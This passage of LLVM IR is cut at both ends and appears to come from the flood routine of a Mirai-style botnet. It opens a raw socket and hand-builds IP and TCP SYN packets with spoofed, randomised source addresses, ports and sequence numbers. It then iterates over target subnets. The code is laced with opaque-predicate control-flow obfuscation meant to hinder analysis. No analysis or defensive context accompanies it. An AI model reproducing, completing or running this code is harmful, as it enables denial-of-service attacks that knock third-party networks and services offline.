  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8**, align 8
  %22 = alloca i8, align 1
  %23 = alloca i16, align 2
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i16, align 2
  %27 = alloca i16, align 2
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8, align 1
  %31 = alloca i8, align 1
  %32 = alloca i8, align 1
  %33 = alloca i8, align 1
  %34 = alloca i8, align 1
  %35 = alloca i8, align 1
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca %struct.iphdr*, align 8
  %39 = alloca %struct.tcphdr*, align 8
  %40 = alloca i8*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca %struct.iphdr*, align 8
  %43 = alloca %struct.tcphdr*, align 8
  %44 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %14, align 4
  store i8 %1, i8* %15, align 1
  store %struct.attack_target* %2, %struct.attack_target** %16, align 8
  store i8 %3, i8* %17, align 1
  store %struct.attack_option* %4, %struct.attack_option** %18, align 8
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %45 = load i8, i8* %15, align 1
  %46 = zext i8 %45 to i64
  %47 = call noalias i8* @calloc(i64 %46, i64 8) #6
  %48 = bitcast i8* %47 to i8**
  store i8** %48, i8*** %21, align 8
  %49 = load i8, i8* %17, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 2, i32 0)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %22, align 1
  %53 = load i8, i8* %17, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 3, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %23, align 2
  %57 = load i8, i8* %17, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 4, i32 64)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %24, align 1
  %61 = load i8, i8* %17, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 5, i32 1)
  %64 = trunc i32 %63 to i8
  store i8 %64, i8* %25, align 1
  %65 = load i8, i8* %17, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 6, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %26, align 2
  %69 = load i8, i8* %17, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 7, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %27, align 2
  %73 = load i8, i8* %17, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 16, i32 65535)
  store i32 %75, i32* %28, align 4
  %76 = load i8, i8* %17, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 17, i32 0)
  store i32 %78, i32* %29, align 4
  %79 = load i8, i8* %17, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 10, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %30, align 1
  %83 = load i8, i8* %17, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 11, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %31, align 1
  %87 = load i8, i8* %17, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 12, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %32, align 1
  %91 = load i8, i8* %17, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 13, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %33, align 1
  %95 = load i8, i8* %17, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 14, i32 1)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %34, align 1
  %99 = load i8, i8* %17, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 15, i32 0)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %35, align 1
  %103 = load i8, i8* %17, align 1
  %104 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %105 = load i32, i32* @LOCAL_ADDR, align 4
  %106 = call i32 @attack_get_opt_ip(i8 zeroext %103, %struct.attack_option* %104, i8 zeroext 19, i32 %105)
  store i32 %106, i32* %36, align 4
  %107 = call i64 @time(i64* null) #6
  %108 = load i32, i32* %14, align 4
  %109 = sext i32 %108 to i64
  %110 = add nsw i64 %107, %109
  %111 = trunc i64 %110 to i32
  store i32 %111, i32* %37, align 4
  %112 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %112, i32* %20, align 4
  %113 = icmp eq i32 %112, -1
  %114 = load i32, i32* @x.23
  %115 = load i32, i32* @y.24
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %113, label %122, label %123

; <label>:122:                                    ; preds = %originalBBpart2
  br label %611

; <label>:123:                                    ; preds = %originalBBpart2
  store i32 1, i32* %19, align 4
  %124 = load i32, i32* %20, align 4
  %125 = bitcast i32* %19 to i8*
  %126 = call i32 @setsockopt(i32 %124, i32 0, i32 3, i8* %125, i32 4) #6
  %127 = icmp eq i32 %126, -1
  br i1 %127, label %128, label %147

; <label>:128:                                    ; preds = %123
  %129 = load i32, i32* @x.23
  %130 = load i32, i32* @y.24
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB2, label %originalBB2alteredBB

originalBB2:                                      ; preds = %originalBB2alteredBB, %128
  %137 = load i32, i32* %20, align 4
  %138 = call i32 @close(i32 %137)
  %139 = load i32, i32* @x.23
  %140 = load i32, i32* @y.24
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBBpart24, label %originalBB2alteredBB

originalBBpart24:                                 ; preds = %originalBB2
  br label %611

; <label>:147:                                    ; preds = %123
  store i32 0, i32* %19, align 4
  br label %148

; <label>:148:                                    ; preds = %originalBBpart2241, %147
  %149 = load i32, i32* %19, align 4
  %150 = load i8, i8* %15, align 1
  %151 = zext i8 %150 to i32
  %152 = icmp slt i32 %149, %151
  br i1 %152, label %153, label %376

; <label>:153:                                    ; preds = %148
  %154 = load i32, i32* @x.23
  %155 = load i32, i32* @y.24
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %153
  %162 = call noalias i8* @calloc(i64 128, i64 1) #6
  %163 = load i8**, i8*** %21, align 8
  %164 = load i32, i32* %19, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds i8*, i8** %163, i64 %165
  store i8* %162, i8** %166, align 8
  %167 = load i8**, i8*** %21, align 8
  %168 = load i32, i32* %19, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds i8*, i8** %167, i64 %169
  %171 = load i8*, i8** %170, align 8
  %172 = bitcast i8* %171 to %struct.iphdr*
  store %struct.iphdr* %172, %struct.iphdr** %38, align 8
  %173 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i64 1
  %175 = bitcast %struct.iphdr* %174 to %struct.tcphdr*
  store %struct.tcphdr* %175, %struct.tcphdr** %39, align 8
  %176 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i64 1
  %178 = bitcast %struct.tcphdr* %177 to i8*
  store i8* %178, i8** %40, align 8
  %179 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %180 = bitcast %struct.iphdr* %179 to i8*
  %181 = load i8, i8* %180, align 4
  %182 = and i8 %181, 15
  %183 = or i8 %182, 64
  store i8 %183, i8* %180, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %185 = bitcast %struct.iphdr* %184 to i8*
  %186 = load i8, i8* %185, align 4
  %187 = and i8 %186, -16
  %188 = or i8 %187, 5
  store i8 %188, i8* %185, align 4
  %189 = load i8, i8* %22, align 1
  %190 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 1
  store i8 %189, i8* %191, align 1
  %192 = call zeroext i16 @htons(i16 zeroext 60) #7
  %193 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 2
  store i16 %192, i16* %194, align 2
  %195 = load i16, i16* %23, align 2
  %196 = call zeroext i16 @htons(i16 zeroext %195) #7
  %197 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 3
  store i16 %196, i16* %198, align 4
  %199 = load i8, i8* %24, align 1
  %200 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 5
  store i8 %199, i8* %201, align 4
  %202 = load i8, i8* %25, align 1
  %203 = icmp ne i8 %202, 0
  %204 = load i32, i32* @x.23
  %205 = load i32, i32* @y.24
  %206 = sub i32 %204, 1
  %207 = mul i32 %204, %206
  %208 = urem i32 %207, 2
  %209 = icmp eq i32 %208, 0
  %210 = icmp slt i32 %205, 10
  %211 = or i1 %209, %210
  br i1 %211, label %originalBBpart236, label %originalBB6alteredBB

originalBBpart236:                                ; preds = %originalBB6
  br i1 %203, label %212, label %216

; <label>:212:                                    ; preds = %originalBBpart236
  %213 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %214 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 4
  store i16 %213, i16* %215, align 2
  br label %216

; <label>:216:                                    ; preds = %212, %originalBBpart236
  %217 = load i32, i32* @x.23
  %218 = load i32, i32* @y.24
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %216
  %225 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 6
  store i8 6, i8* %226, align 1
  %227 = load i32, i32* %36, align 4
  %228 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 8
  store i32 %227, i32* %229, align 4
  %230 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %231 = load i32, i32* %19, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %230, i64 %232
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %233, i32 0, i32 1
  %235 = load i32, i32* %234, align 4
  %236 = load %struct.iphdr*, %struct.iphdr** %38, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 9
  store i32 %235, i32* %237, align 4
  %238 = load i16, i16* %26, align 2
  %239 = call zeroext i16 @htons(i16 zeroext %238) #7
  %240 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 0
  store i16 %239, i16* %241, align 4
  %242 = load i16, i16* %27, align 2
  %243 = call zeroext i16 @htons(i16 zeroext %242) #7
  %244 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 1
  store i16 %243, i16* %245, align 2
  %246 = load i32, i32* %28, align 4
  %247 = trunc i32 %246 to i16
  %248 = call zeroext i16 @htons(i16 zeroext %247) #7
  %249 = zext i16 %248 to i32
  %250 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 2
  store i32 %249, i32* %251, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = and i16 %254, -241
  %256 = or i16 %255, 160
  store i16 %256, i16* %253, align 4
  %257 = load i8, i8* %30, align 1
  %258 = sext i8 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 4
  %261 = load i16, i16* %260, align 4
  %262 = and i16 %258, 1
  %263 = shl i16 %262, 13
  %264 = and i16 %261, -8193
  %265 = or i16 %264, %263
  store i16 %265, i16* %260, align 4
  %266 = load i8, i8* %31, align 1
  %267 = sext i8 %266 to i16
  %268 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 4
  %270 = load i16, i16* %269, align 4
  %271 = and i16 %267, 1
  %272 = shl i16 %271, 12
  %273 = and i16 %270, -4097
  %274 = or i16 %273, %272
  store i16 %274, i16* %269, align 4
  %275 = load i8, i8* %32, align 1
  %276 = sext i8 %275 to i16
  %277 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %278 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %277, i32 0, i32 4
  %279 = load i16, i16* %278, align 4
  %280 = and i16 %276, 1
  %281 = shl i16 %280, 11
  %282 = and i16 %279, -2049
  %283 = or i16 %282, %281
  store i16 %283, i16* %278, align 4
  %284 = load i8, i8* %33, align 1
  %285 = sext i8 %284 to i16
  %286 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %287 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %286, i32 0, i32 4
  %288 = load i16, i16* %287, align 4
  %289 = and i16 %285, 1
  %290 = shl i16 %289, 10
  %291 = and i16 %288, -1025
  %292 = or i16 %291, %290
  store i16 %292, i16* %287, align 4
  %293 = load i8, i8* %34, align 1
  %294 = sext i8 %293 to i16
  %295 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %296 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %295, i32 0, i32 4
  %297 = load i16, i16* %296, align 4
  %298 = and i16 %294, 1
  %299 = shl i16 %298, 9
  %300 = and i16 %297, -513
  %301 = or i16 %300, %299
  store i16 %301, i16* %296, align 4
  %302 = load i8, i8* %35, align 1
  %303 = sext i8 %302 to i16
  %304 = load %struct.tcphdr*, %struct.tcphdr** %39, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i32 0, i32 4
  %306 = load i16, i16* %305, align 4
  %307 = and i16 %303, 1
  %308 = shl i16 %307, 8
  %309 = and i16 %306, -257
  %310 = or i16 %309, %308
  store i16 %310, i16* %305, align 4
  %311 = load i8*, i8** %40, align 8
  %312 = getelementptr inbounds i8, i8* %311, i32 1
  store i8* %312, i8** %40, align 8
  store i8 2, i8* %311, align 1
  %313 = load i8*, i8** %40, align 8
  %314 = getelementptr inbounds i8, i8* %313, i32 1
  store i8* %314, i8** %40, align 8
  store i8 4, i8* %313, align 1
  %315 = call i32 @rand_next()
  %316 = and i32 %315, 15
  %317 = add i32 1400, %316
  %318 = trunc i32 %317 to i16
  %319 = call zeroext i16 @htons(i16 zeroext %318) #7
  %320 = load i8*, i8** %40, align 8
  %321 = bitcast i8* %320 to i16*
  store i16 %319, i16* %321, align 2
  %322 = load i8*, i8** %40, align 8
  %323 = getelementptr inbounds i8, i8* %322, i64 2
  store i8* %323, i8** %40, align 8
  %324 = load i8*, i8** %40, align 8
  %325 = getelementptr inbounds i8, i8* %324, i32 1
  store i8* %325, i8** %40, align 8
  store i8 4, i8* %324, align 1
  %326 = load i8*, i8** %40, align 8
  %327 = getelementptr inbounds i8, i8* %326, i32 1
  store i8* %327, i8** %40, align 8
  store i8 2, i8* %326, align 1
  %328 = load i8*, i8** %40, align 8
  %329 = getelementptr inbounds i8, i8* %328, i32 1
  store i8* %329, i8** %40, align 8
  store i8 8, i8* %328, align 1
  %330 = load i8*, i8** %40, align 8
  %331 = getelementptr inbounds i8, i8* %330, i32 1
  store i8* %331, i8** %40, align 8
  store i8 10, i8* %330, align 1
  %332 = call i32 @rand_next()
  %333 = load i8*, i8** %40, align 8
  %334 = bitcast i8* %333 to i32*
  store i32 %332, i32* %334, align 4
  %335 = load i8*, i8** %40, align 8
  %336 = getelementptr inbounds i8, i8* %335, i64 4
  store i8* %336, i8** %40, align 8
  %337 = load i8*, i8** %40, align 8
  %338 = bitcast i8* %337 to i32*
  store i32 0, i32* %338, align 4
  %339 = load i8*, i8** %40, align 8
  %340 = getelementptr inbounds i8, i8* %339, i64 4
  store i8* %340, i8** %40, align 8
  %341 = load i8*, i8** %40, align 8
  %342 = getelementptr inbounds i8, i8* %341, i32 1
  store i8* %342, i8** %40, align 8
  store i8 1, i8* %341, align 1
  %343 = load i8*, i8** %40, align 8
  %344 = getelementptr inbounds i8, i8* %343, i32 1
  store i8* %344, i8** %40, align 8
  store i8 3, i8* %343, align 1
  %345 = load i8*, i8** %40, align 8
  %346 = getelementptr inbounds i8, i8* %345, i32 1
  store i8* %346, i8** %40, align 8
  store i8 3, i8* %345, align 1
  %347 = load i8*, i8** %40, align 8
  %348 = getelementptr inbounds i8, i8* %347, i32 1
  store i8* %348, i8** %40, align 8
  store i8 6, i8* %347, align 1
  %349 = load i32, i32* @x.23
  %350 = load i32, i32* @y.24
  %351 = sub i32 %349, 1
  %352 = mul i32 %349, %351
  %353 = urem i32 %352, 2
  %354 = icmp eq i32 %353, 0
  %355 = icmp slt i32 %350, 10
  %356 = or i1 %354, %355
  br i1 %356, label %originalBBpart2227, label %originalBB38alteredBB

originalBBpart2227:                               ; preds = %originalBB38
  br label %357

; <label>:357:                                    ; preds = %originalBBpart2227
  %358 = load i32, i32* @x.23
  %359 = load i32, i32* @y.24
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBB229, label %originalBB229alteredBB

originalBB229:                                    ; preds = %originalBB229alteredBB, %357
  %366 = load i32, i32* %19, align 4
  %367 = add nsw i32 %366, 1
  store i32 %367, i32* %19, align 4
  %368 = load i32, i32* @x.23
  %369 = load i32, i32* @y.24
  %370 = sub i32 %368, 1
  %371 = mul i32 %368, %370
  %372 = urem i32 %371, 2
  %373 = icmp eq i32 %372, 0
  %374 = icmp slt i32 %369, 10
  %375 = or i1 %373, %374
  br i1 %375, label %originalBBpart2241, label %originalBB229alteredBB

originalBBpart2241:                               ; preds = %originalBB229
  br label %148

; <label>:376:                                    ; preds = %148
  %377 = load i32, i32* @x.23
  %378 = load i32, i32* @y.24
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBB243, label %originalBB243alteredBB

originalBB243:                                    ; preds = %originalBB243alteredBB, %376
  %385 = load i32, i32* @x.23
  %386 = load i32, i32* @y.24
  %387 = sub i32 %385, 1
  %388 = mul i32 %385, %387
  %389 = urem i32 %388, 2
  %390 = icmp eq i32 %389, 0
  %391 = icmp slt i32 %386, 10
  %392 = or i1 %390, %391
  br i1 %392, label %originalBBpart2245, label %originalBB243alteredBB

originalBBpart2245:                               ; preds = %originalBB243
  br label %393

; <label>:393:                                    ; preds = %originalBBpart2261, %originalBBpart2245
  %394 = load i32, i32* @x.23
  %395 = load i32, i32* @y.24
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBB247, label %originalBB247alteredBB

originalBB247:                                    ; preds = %originalBB247alteredBB, %393
  store i32 0, i32* %19, align 4
  %402 = load i32, i32* @x.23
  %403 = load i32, i32* @y.24
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBBpart2249, label %originalBB247alteredBB

originalBBpart2249:                               ; preds = %originalBB247
  br label %410

; <label>:410:                                    ; preds = %569, %originalBBpart2249
  %411 = load i32, i32* %19, align 4
  %412 = load i8, i8* %15, align 1
  %413 = zext i8 %412 to i32
  %414 = icmp slt i32 %411, %413
  br i1 %414, label %415, label %572

; <label>:415:                                    ; preds = %410
  %416 = load i8**, i8*** %21, align 8
  %417 = load i32, i32* %19, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds i8*, i8** %416, i64 %418
  %420 = load i8*, i8** %419, align 8
  store i8* %420, i8** %41, align 8
  %421 = load i8*, i8** %41, align 8
  %422 = bitcast i8* %421 to %struct.iphdr*
  store %struct.iphdr* %422, %struct.iphdr** %42, align 8
  %423 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i64 1
  %425 = bitcast %struct.iphdr* %424 to %struct.tcphdr*
  store %struct.tcphdr* %425, %struct.tcphdr** %43, align 8
  %426 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %427 = load i32, i32* %19, align 4
  %428 = sext i32 %427 to i64
  %429 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %426, i64 %428
  %430 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %429, i32 0, i32 2
  %431 = load i8, i8* %430, align 4
  %432 = zext i8 %431 to i32
  %433 = icmp slt i32 %432, 32
  br i1 %433, label %434, label %455

; <label>:434:                                    ; preds = %415
  %435 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %436 = load i32, i32* %19, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %435, i64 %437
  %439 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %438, i32 0, i32 1
  %440 = load i32, i32* %439, align 4
  %441 = call i32 @ntohl(i32 %440) #7
  %442 = call i32 @rand_next()
  %443 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %444 = load i32, i32* %19, align 4
  %445 = sext i32 %444 to i64
  %446 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %443, i64 %445
  %447 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i32 0, i32 2
  %448 = load i8, i8* %447, align 4
  %449 = zext i8 %448 to i32
  %450 = lshr i32 %442, %449
  %451 = add i32 %441, %450
  %452 = call i32 @htonl(i32 %451) #7
  %453 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %454 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %453, i32 0, i32 9
  store i32 %452, i32* %454, align 4
  br label %455

; <label>:455:                                    ; preds = %434, %415
  %456 = load i32, i32* %36, align 4
  %457 = icmp eq i32 %456, -1
  br i1 %457, label %458, label %478

; <label>:458:                                    ; preds = %455
  %459 = load i32, i32* @x.23
  %460 = load i32, i32* @y.24
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBB251, label %originalBB251alteredBB

originalBB251:                                    ; preds = %originalBB251alteredBB, %458
  %467 = call i32 @rand_next()
  %468 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %469 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %468, i32 0, i32 8
  store i32 %467, i32* %469, align 4
  %470 = load i32, i32* @x.23
  %471 = load i32, i32* @y.24
  %472 = sub i32 %470, 1
  %473 = mul i32 %470, %472
  %474 = urem i32 %473, 2
  %475 = icmp eq i32 %474, 0
  %476 = icmp slt i32 %471, 10
  %477 = or i1 %475, %476
  br i1 %477, label %originalBBpart2253, label %originalBB251alteredBB

originalBBpart2253:                               ; preds = %originalBB251
  br label %478

; <label>:478:                                    ; preds = %originalBBpart2253, %455
  %479 = load i16, i16* %23, align 2
  %480 = zext i16 %479 to i32
  %481 = icmp eq i32 %480, 65535
  br i1 %481, label %482, label %488

; <label>:482:                                    ; preds = %478
  %483 = call i32 @rand_next()
  %484 = and i32 %483, 65535
  %485 = trunc i32 %484 to i16
  %486 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %487 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %486, i32 0, i32 3
  store i16 %485, i16* %487, align 4
  br label %488

; <label>:488:                                    ; preds = %482, %478
  %489 = load i16, i16* %26, align 2
  %490 = zext i16 %489 to i32
  %491 = icmp eq i32 %490, 65535
  br i1 %491, label %492, label %498

; <label>:492:                                    ; preds = %488
  %493 = call i32 @rand_next()
  %494 = and i32 %493, 65535
  %495 = trunc i32 %494 to i16
  %496 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %497 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %496, i32 0, i32 0
  store i16 %495, i16* %497, align 4
  br label %498

; <label>:498:                                    ; preds = %492, %488
  %499 = load i16, i16* %27, align 2
  %500 = zext i16 %499 to i32
  %501 = icmp eq i32 %500, 65535
  br i1 %501, label %502, label %508

; <label>:502:                                    ; preds = %498
  %503 = call i32 @rand_next()
  %504 = and i32 %503, 65535
  %505 = trunc i32 %504 to i16
  %506 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %507 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %506, i32 0, i32 1
  store i16 %505, i16* %507, align 2
  br label %508

; <label>:508:                                    ; preds = %502, %498
  %509 = load i32, i32* %28, align 4
  %510 = icmp eq i32 %509, 65535
  br i1 %510, label %511, label %515

; <label>:511:                                    ; preds = %508
  %512 = call i32 @rand_next()
  %513 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i32 0, i32 2
  store i32 %512, i32* %514, align 4
  br label %515

; <label>:515:                                    ; preds = %511, %508
  %516 = load i32, i32* %29, align 4
  %517 = icmp eq i32 %516, 65535
  br i1 %517, label %518, label %522

; <label>:518:                                    ; preds = %515
  %519 = call i32 @rand_next()
  %520 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %521 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %520, i32 0, i32 3
  store i32 %519, i32* %521, align 4
  br label %522

; <label>:522:                                    ; preds = %518, %515
  %523 = load i8, i8* %30, align 1
  %524 = icmp ne i8 %523, 0
  br i1 %524, label %525, label %531

; <label>:525:                                    ; preds = %522
  %526 = call i32 @rand_next()
  %527 = and i32 %526, 65535
  %528 = trunc i32 %527 to i16
  %529 = load %struct.tcphdr*, %struct.tcphdr** %43, align 8
  %530 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %529, i32 0, i32 7
  store i16 %528, i16* %530, align 2
  br label %531

; <label>:531:                                    ; preds = %525, %522
  %532 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %533 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %532, i32 0, i32 7
  store i16 0, i16* %533, align 2
  %534 = load %struct.iphdr*, %struct.iphdr** %42, align 8
  %535 = bitcast %struct.iphdr* %534 to i16*
  %536 = call zeroext i16 @checksum_generic(i16* %535, i32 20)
  %537 = load %struct.iphdr*, %struct.iphdr** %42, align 8
